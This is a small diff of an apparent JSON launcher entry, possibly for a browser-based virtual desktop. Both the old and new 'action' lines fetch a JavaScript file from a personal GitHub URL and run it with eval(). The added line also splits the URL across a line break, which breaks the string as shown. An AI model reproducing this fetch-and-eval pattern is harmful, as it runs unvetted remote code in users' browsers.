@@ -1,1 +1,2 @@
-{"action":"fetch('https://raw.githubusercontent.com/ivorydevrimoalt/QUENQULTRAJAVASCRIPTLIST/refs/heads/main/BILLYRETURNS.js').then(r=>r.text()).then(t=>eval(t))","vfsIconPath":"https://i.pinimg.com/originals/51/2d/08/512d0838ca8dc7c20d402d891d62df1a.gif"}
+{"action":"fetch('https://raw.githubusercontent.com/ivorydevrimoalt/EVERYTYPEOFBILLYJAVASCRIPTLIST
+/refs/heads/main/JS/Quenq.js').then(r=>r.text()).then(t=>eval(t))","vfsIconPath":"https://i.pinimg.com/originals/51/2d/08/512d0838ca8dc7c20d402d891d62df1a.gif"}
